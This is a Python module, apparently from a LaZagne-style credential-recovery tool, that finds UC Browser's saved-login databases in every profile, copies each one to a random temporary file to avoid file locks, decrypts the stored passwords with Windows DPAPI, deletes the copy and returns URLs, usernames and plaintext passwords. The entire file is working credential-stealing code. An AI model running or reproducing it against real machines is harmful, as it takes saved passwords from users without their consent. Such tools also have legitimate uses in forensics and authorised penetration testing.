# -*- coding: utf-8 -*-
import json
import os
import random
import shutil
import sqlite3
import string
import tempfile
import traceback

from xdsmoc.config.constant import constant
from xdsmoc.config.module_info import ModuleInfo
from xdsmoc.config.winstructure import Win32CryptUnprotectData


class UCBrowser(ModuleInfo):
    def __init__(self):
        self.database_query = '''SELECT action_url, username_value, password_value,  datetime(date_created / \
                      1000000 + (strftime('%s', '1601-01-01')), 'unixepoch') FROM wow_logins'''

        ModuleInfo.__init__(self, 'uc browser', 'browsers', winapi_used=True)
        paths = u'{LOCALAPPDATA}\\UCBrowser\\User Data'
        self.paths = paths if isinstance(paths, list) else [paths]

    def _get_database_dirs(self):
        """
        Return database directories for all profiles within all paths
        """
        databases = set()
        for path in [p.format(**constant.profile) for p in self.paths]:
            profiles_path = os.path.join(path, u'Local State')
            if os.path.exists(profiles_path):
                # List all users profile (empty string means current dir, without a profile)
                profiles = {'Default', ''}
                with open(profiles_path) as f:
                    try:
                        data = json.load(f)
                        # Add profiles from json to Default profile. set removes duplicates
                        profiles |= set(data['profile']['info_cache'])
                    except Exception:
                        pass
                # Each profile has its own password database
                for profile in profiles:
                    # Some browsers use names other than "Login Data"
                    # Like YandexBrowser - "Ya Login Data", UC Browser - "UC Login Data.18"
                    try:
                        db_files = os.listdir(os.path.join(path, profile))
                    except Exception:
                        continue
                    for db in db_files:
                        if u'login data' in db.lower():
                            databases.add(os.path.join(path, profile, db))
        return databases

    def _export_credentials(self, db_path):
        """
        Export credentials from the given database

        :param unicode db_path: database path
        :return: list of credentials
        :rtype: tuple
        """
        credentials = []

        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            cursor.execute(self.database_query)
        except Exception as e:
            self.debug(str(e))
            return credentials

        for url, login, password, create_time in cursor.fetchall():
            try:
                # Decrypt the Password
                password = Win32CryptUnprotectData(password, is_current_user=constant.is_current_user,
                                                   user_dpapi=constant.user_dpapi)
                if not url and not login and not password:
                    continue

                credentials.append((url, login, password, create_time))
            except Exception:
                self.debug(traceback.format_exc())

        conn.close()
        return credentials

    def copy_db(self, database_path):
        """
        Copying db will bypass lock errors
        Using user tempfile will produce an error when impersonating users (Permission denied)
        A public directory should be used if this error occured (e.g C:\\Users\\Public)
        """
        random_name = ''.join([random.choice(string.ascii_lowercase) for i in range(9)])
        root_dir = [
            tempfile.gettempdir(),
            os.environ.get('PUBLIC', None),
            os.environ.get('SystemDrive', None) + '\\',
        ]
        for r in root_dir:
            try:
                temp = os.path.join(r, random_name)
                shutil.copy(database_path, temp)
                self.debug(u'Temporary db copied: {db_path}'.format(db_path=temp))
                return temp
            except Exception:
                self.debug(traceback.format_exc())
        return False

    def clean_file(self, db_path):
        try:
            os.remove(db_path)
        except Exception:
            self.debug(traceback.format_exc())

    def run(self):
        credentials = []

        for database_path in self._get_database_dirs():
            # Remove Google Chrome false positif
            if database_path.endswith('Login Data-journal'):
                continue
            self.debug('Database found: {db}'.format(db=database_path))

            # Copy database before to query it (bypass lock errors)
            path = self.copy_db(database_path)
            if path:
                try:
                    credentials.extend(self._export_credentials(path))
                except Exception:
                    self.debug(traceback.format_exc())
                self.clean_file(path)

        return [{'URL': url, 'Login': login, 'Password': password, 'Create_time': create_time} \
                for url, login, password, create_time in set(credentials)]
